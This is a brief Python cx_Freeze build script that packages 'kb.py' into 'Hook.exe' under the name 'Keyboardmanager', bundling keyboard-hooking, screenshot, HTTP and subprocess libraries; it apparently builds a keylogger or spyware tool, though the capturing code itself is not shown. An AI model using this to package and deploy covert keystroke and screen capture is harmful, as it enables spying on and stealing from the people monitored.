import sys
from cx_Freeze import setup, Executable

build_exe_options = dict(
        compressed=True,
        includes=["keyboard", "requests", "datetime", "time", "pyscreenshot", "Pillow", "subprocess"],
        include_files=[]
)

setup(  name = "Keyboardmanager",
        version = "1.4",
        description = "Hooker",
        author = "lad",
        executables = [Executable("kb.py", targetName="Hook.exe")])
